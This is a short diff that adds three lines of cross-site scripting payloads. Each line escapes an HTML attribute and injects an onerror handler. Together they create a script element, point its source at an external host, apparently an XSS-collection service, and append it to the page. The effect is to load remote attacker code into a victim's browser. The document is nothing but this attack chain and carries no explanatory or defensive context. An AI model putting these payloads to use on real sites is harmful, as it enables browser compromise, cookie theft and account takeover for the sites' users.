@@ -1,0 +1,3 @@
+'&quot; onerror=s.src='http://xss.chinacycc.com/jF5Sf0?1483662461';//
+'&quot; onerror=body.appendChild(s);//
+'&quot; onerror=s=createElement('script');//
